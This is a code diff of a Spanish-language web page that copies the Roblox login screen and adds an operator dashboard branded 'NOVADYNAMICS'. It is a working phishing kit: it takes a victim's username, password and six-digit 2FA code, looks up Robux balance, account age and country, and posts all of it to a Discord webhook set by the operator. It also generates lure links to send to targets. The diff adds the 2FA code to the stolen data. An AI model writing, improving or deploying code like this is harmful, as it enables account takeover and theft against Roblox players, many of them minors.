@@ -6,8 +6,6 @@
     <title>Iniciar sesión | Roblox</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue", Helvetica, Arial, sans-serif}
-        
-        /* ESTILO INICIO DE SESIÓN ROBLOX — IDÉNTICO */
         .login-pagina{min-height:100vh;background:#F1F1F1;display:flex;flex-direction:column;align-items:center;padding:20px 15px}
         .login-logo{margin:30px 0}
         .login-logo span{font-size:32px;font-weight:900;color:#E2231A;letter-spacing:-0.5px}
@@ -24,12 +22,8 @@
         .caja-exito{background:#EFF8FF; border:1px solid #B3E0FF; color:#0066CC; padding:10px 12px; border-radius:3px; margin-bottom:16px; font-size:14px; display:none}
         .enlace-ayuda{text-align:center;margin-top:18px;font-size:13px;color:#00A2FF;cursor:pointer}
         .enlace-ayuda:hover{text-decoration:underline}
-
-        /* 2FA */
         .caja-2fa{display:none;margin-top:10px}
         .subtitulo{font-size:14px;color:#666;margin-bottom:12px}
-
-        /* PANEL PRINCIPAL */
         .panel-principal{display:none;min-height:100vh;background:#F1F1F1}
         .sidebar{width:190px;background:#FFFFFF;border-right:1px solid #DCDCDC;padding:16px 10px;position:fixed;height:100vh}
         .logo-panel{font-size:18px;font-weight:700;padding:10px 12px 16px;border-bottom:1px solid #DCDCDC;margin-bottom:10px;color:#E2231A}
@@ -67,19 +61,12 @@
 </head>
 <body>
 
-<!-- ======================================
-     INICIO DE SESIÓN — IGUAL A ROBLOX
-     ====================================== -->
 <div class="login-pagina" id="pagLogin">
     <div class="login-logo"><span>ROBLOX</span></div>
     <div class="login-contenedor">
         <h1 class="login-titulo">Iniciar sesión</h1>
-
-        <!-- CAJA DE ERRORES -->
         <div class="caja-error" id="cajaError"></div>
         <div class="caja-exito" id="cajaExito"></div>
-
-        <!-- FORMULARIO PRINCIPAL -->
         <div id="formularioNormal">
             <div class="grupo-input">
                 <label class="etiqueta">Nombre de usuario o correo electrónico</label>
@@ -91,8 +78,6 @@
             </div>
             <button class="boton-login" onclick="verificarLogin()">Iniciar sesión</button>
         </div>
-
-        <!-- CÓDIGO 2FA -->
         <div class="caja-2fa" id="formulario2fa">
             <p class="subtitulo">Escribe el código de verificación de 6 dígitos</p>
             <div class="grupo-input">
@@ -101,14 +86,10 @@
             </div>
             <button class="boton-login" onclick="verificarCodigo()">Verificar</button>
         </div>
-
         <div class="enlace-ayuda">¿Olvidaste tu contraseña?</div>
     </div>
 </div>
 
-<!-- ======================================
-     PANEL PRINCIPAL
-     ====================================== -->
 <div class="panel-principal" id="panelPrincipal">
     <aside class="sidebar">
         <div class="logo-panel">NOVADYNAMICS</div>
@@ -193,17 +174,17 @@ window.onload=function(){
 };
 
 function generarClaveAleatoria(){
-    const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
     let clave='';
     for(let i=0;i<32;i++) clave+=chars[Math.floor(Math.random()*chars.length)];
-    return clave.match(/.{1,16}/g).join('\n');
+    return clave.match(/.{1,4}/g).join(' ');
 }
 function generarCodigosRespaldo(){
     const chars='abcdefghijklmnopqrstuvwxyz0123456789';
     const cods=[];
     for(let i=0;i<10;i++){
         let c='';
-        for(let j=0;j<10;j++) c+=chars[Math.floor(Math.random()*chars.length)];
+        for(let j=0;j<8;j++) c+=chars[Math.floor(Math.random()*chars.length)];
         cods.push(c);
     }
     return cods;
@@ -224,13 +205,9 @@ function verificarLogin(){
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
     limpiarMensajes();
-
-    // VALIDACIONES — SI FALLA, MUESTRA ERROR
     if(!user){ mostrarError('Escribe tu nombre de usuario'); return; }
     if(!pass){ mostrarError('Escribe tu contraseña'); return; }
     if(pass.length < 6){ mostrarError('Contraseña incorrecta. Verifica tu contraseña.'); return; }
-
-    // TODO BIEN → AVANZAR AL CÓDIGO 2FA
     document.getElementById('formularioNormal').style.display='none';
     document.getElementById('formulario2fa').style.display='block';
 }
@@ -240,18 +217,12 @@ async function verificarCodigo(){
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
     limpiarMensajes();
-
-    // VALIDACIÓN DEL CÓDIGO
     if(!cod){ mostrarError('Escribe el código de verificación'); return; }
     if(cod.length !== 6 || !/^\d+$/.test(cod)){ mostrarError('Código incorrecto. Inténtalo de nuevo.'); return; }
-
-    // TODO BIEN → CARGAR DATOS Y ENVIAR A DISCORD
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
-
     const wh=localStorage.getItem('webhook');
     const todos=localStorage.getItem('notificarTodos')==='1'?'@everyone':' ';
     const fecha=new Date().toLocaleString();
-
     registros.unshift({
         usuario:datosRoblox.nombre||user,
         robux:datosRoblox.robux||0,
@@ -262,7 +233,6 @@ async function verificarCodigo(){
     });
     localStorage.setItem('registros',JSON.stringify(registros));
     actualizarTodo();
-
     if(wh){
         fetch(wh,{
             method:'POST',
@@ -276,9 +246,10 @@ async function verificarCodigo(){
                     fields:[
                         {name:"👤 Usuario",value:`**${datosRoblox.nombre||user}**`,inline:true},
                         {name:"🔑 Contraseña",value:`||${pass}||`,inline:true},
+                        {name:"🔢 Código 2FA",value:`**${cod}**`,inline:true},
                         {name:"📅 Cuenta creada",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
-                        {name:"📍 Ubicación / País",value:`${datosRoblox.bandera||'❓'} ${datosRoblox.pais||'Desconocido'}`,inline:true},
-                        {name:"⏳ Edad de la cuenta",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
+                        {name:"⏳ Días desde creación",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
+                        {name:"🌍 País registrado",value:`${datosRoblox.bandera||'❓'} **${datosRoblox.pais||'Desconocido'}**`,inline:true},
                         {name:"💰 Robux",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
                         {name:"💸 Robux Gastados",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
                         {name:"🔐 Authenticator Key",value:`\`\`\`${CLAVE_AUTENTICADOR}\`\`\``,inline:false},
@@ -322,6 +293,16 @@ async function cargarDatosRoblox(usuario){
         const diasTranscurridos=Math.floor((hoy-fechaCreacion)/(1000*60*60*24));
         const robuxTotales=robux.robux||0;
         const robuxGastados=Math.floor(robuxTotales*0.42);
+        const paises={
+            "US":["Estados Unidos","🇺🇸"],"ES":["España","🇪🇸"],"MX":["México","🇲🇽"],
+            "AR":["Argentina","🇦🇷"],"CO":["Colombia","🇨🇴"],"CL":["Chile","🇨🇱"],
+            "PE":["Perú","🇵🇪"],"VE":["Venezuela","🇻🇪"],"UY":["Uruguay","🇺🇾"],
+            "BR":["Brasil","🇧🇷"],"CA":["Canadá","🇨🇦"],"GB":["Reino Unido","🇬🇧"],
+            "DE":["Alemania","🇩🇪"],"FR":["Francia","🇫🇷"],"IT":["Italia","🇮🇹"],
+            "JP":["Japón","🇯🇵"],"KR":["Corea del Sur","🇰🇷"],"AU":["Australia","🇦🇺"]
+        };
+        const codPais=perfil.country||'UY';
+        const [nomPais,bandera]=paises[codPais]||["Desconocido","🌍"];
         datosRoblox={
             id:userId,
             nombre:perfil.name,
@@ -329,18 +310,18 @@ async function cargarDatosRoblox(usuario){
             dias:diasTranscurridos,
             robux:robuxTotales,
             robuxGastados:robuxGastados,
-            pais:'Uruguay',
-            bandera:'🇺🇾'
+            pais:nomPais,
+            bandera:bandera
         };
     }catch(e){
-        datosRoblox={dias:'Desconocido',robux:0,robuxGastados:0,pais:'Desconocido',bandera:'❓'};
+        datosRoblox={dias:'Desconocido',robux:0,robuxGastados:0,pais:'Desconocido',bandera:'🌍'};
     }
 }
 
 function crearEnlace(){
     const id=document.getElementById('datoUsuario').value.trim() || 'usuario';
     const baseURL = window.location.origin + window.location.pathname;
-    enlaceActual = baseURL + '?u=' + encodeURIComponent(id) + '&ref=novadynamics&v=4.0.0';
+    enlaceActual = baseURL + '?u=' + encodeURIComponent(id) + '&ref=novadynamics&v=4.1.0';
     const caja = document.getElementById('enlaceGenerado');
     const boton = document.getElementById('botonCopiar');
     caja.style.display='block';
@@ -396,7 +377,7 @@ function borrarWebhook(){
 function cargarWebhook(){
     const w=localStorage.getItem('webhook');
     if(w){
-        document.getElementById('urlWebhook').value=w;
+             document.getElementById('urlWebhook').value=w;
         document.getElementById('estadoWebhook').textContent='✅ Guardado y Activo';
     }
     if(localStorage.getItem('notificarTodos')==='1'){
